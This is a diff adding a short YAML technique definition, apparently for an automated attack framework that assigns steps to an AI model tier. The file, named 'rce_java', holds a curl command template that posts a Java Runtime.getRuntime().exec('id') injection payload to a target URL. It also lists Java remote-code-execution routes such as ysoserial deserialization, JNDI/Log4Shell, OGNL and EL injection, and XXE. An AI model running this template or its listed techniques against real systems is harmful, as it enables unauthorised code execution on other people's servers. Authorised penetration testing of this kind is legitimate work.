@@ -1,0 +1,16 @@
+name: rce_java
+category: web
+description: Java RCE techniques
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s '{target_url}' -d 'input=Runtime.getRuntime().exec("id")'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Java RCE: deserialization (ysoserial gadgets), JNDI injection (Log4Shell), OGNL injection (Struts), EL injection (JSP/JSF), XXE in XML parsers."
